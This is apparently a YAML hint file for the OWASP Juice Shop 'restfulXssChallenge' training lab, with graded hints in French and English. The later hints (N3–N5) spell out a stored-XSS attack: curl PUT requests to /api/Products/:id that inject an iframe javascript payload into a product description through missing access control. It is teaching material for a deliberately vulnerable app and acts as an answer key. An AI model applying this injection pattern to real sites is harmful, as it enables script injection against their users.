@@ -1,0 +1,122 @@
+challenge_key: "restfulXssChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP officiel #1 : "You need to work with the server-
+      side API directly. Try different HTTP verbs on different
+      entities exposed through the API". Le challenge interdit
+      explicitement le frontend ("without using the frontend at
+      all"). Donc il faut un outil HTTP : curl, Postman, Burp
+      Repeater. Sur quelle entite Juice Shop expose-t-elle un
+      contenu rich-text affichable plus tard sur le site ?
+    text_en: |
+      Official OWASP hint #1: "You need to work with the
+      server-side API directly. Try different HTTP verbs on
+      different entities exposed through the API". Challenge
+      explicitly forbids frontend ("without using the frontend
+      at all"). So you need an HTTP tool: curl, Postman, Burp
+      Repeater. Which Juice Shop entity exposes rich-text
+      content displayable later on the site?
+    pedagogical_intent: |
+      Activate the API-tampering reflex on persisted-content entities.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      Pre-requis pedagogique : as-tu deja resolu
+      changeProductChallenge ? Si oui, tu sais que /api/Products/:id
+      accepte PUT sans auth admin. La description produit est
+      affichee sur la page search avec [innerHTML] apres
+      bypassSecurityTrustHtml — donc tout HTML stocke dans
+      description s'execute au render. Hint OWASP #3 : "Careless
+      developers might have exposed API methods that the client
+      does not even need".
+    text_en: |
+      Pedagogical prerequisite: have you solved
+      changeProductChallenge? If yes, you know /api/Products/:id
+      accepts PUT without admin auth. The product description is
+      shown on the search page via [innerHTML] after
+      bypassSecurityTrustHtml — so any HTML stored in description
+      executes on render. OWASP hint #3: "Careless developers
+      might have exposed API methods that the client does not
+      even need".
+    pedagogical_intent: |
+      Connect to changeProductChallenge knowledge + spell the bypass.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      L'angle est un PUT /api/Products/:id avec un payload XSS
+      dans le champ description. Le payload exact specifie par
+      la description OWASP est :
+      <iframe src="javascript:alert(`xss`)">
+      Important : le challenge demande EXACTEMENT ce payload
+      (sinon il ne se valide pas). N'invente pas un autre payload
+      meme s'il declenche aussi un alert.
+    text_en: |
+      The angle is a PUT /api/Products/:id with an XSS payload
+      in the description field. The exact payload specified by
+      the OWASP description is:
+      <iframe src="javascript:alert(`xss`)">
+      Important: the challenge wants EXACTLY this payload (else
+      it won't validate). Don't invent another payload even if
+      it also triggers an alert.
+    pedagogical_intent: |
+      Pin down the exact required payload.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Squelette du payload curl :
+      curl -X PUT http://127.0.0.1:3000/api/Products/<id>
+        -H "Authorization: Bearer <ton_jwt>"
+        -H "Content-Type: application/json"
+        -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
+      L'id du produit peut etre n'importe lequel (1, 2, 3...). Le
+      serveur stocke le payload brut dans description. Apres
+      cela, naviguer sur la page produit declenche l'iframe.
+    text_en: |
+      curl payload skeleton:
+      curl -X PUT http://127.0.0.1:3000/api/Products/<id>
+        -H "Authorization: Bearer <your_jwt>"
+        -H "Content-Type: application/json"
+        -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
+      Product id can be anything (1, 2, 3...). Server stores
+      payload raw in description. After that, browsing the
+      product page triggers the iframe.
+    pedagogical_intent: |
+      Spell the exact curl with payload.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      Workflow complet :
+      1. Login pour obtenir un JWT (curl POST /rest/user/login).
+      2. PUT /api/Products/1 avec le payload exact :
+         curl -X PUT http://127.0.0.1:3000/api/Products/1
+           -H "Authorization: Bearer <jwt>"
+           -H "Content-Type: application/json"
+           -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
+      3. Navigue sur /#/search ou recherche le produit modifie.
+      4. L'iframe execute, alert apparait, challenge se valide.
+      Source officielle : codefixes/restfulXssChallenge.info.yml
+      fix #1 (correct) explique le bug racine : access control
+      manquant.
+    text_en: |
+      Complete workflow:
+      1. Login to get a JWT (curl POST /rest/user/login).
+      2. PUT /api/Products/1 with exact payload:
+         curl -X PUT http://127.0.0.1:3000/api/Products/1
+           -H "Authorization: Bearer <jwt>"
+           -H "Content-Type: application/json"
+           -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
+      3. Browse to /#/search or look up the modified product.
+      4. Iframe executes, alert appears, challenge solves.
+      Official source: codefixes/restfulXssChallenge.info.yml
+      fix #1 (correct) explains the root: missing access
+      control.
+    pedagogical_intent: |
+      Quasi-solution : full 4-step workflow with source citation.
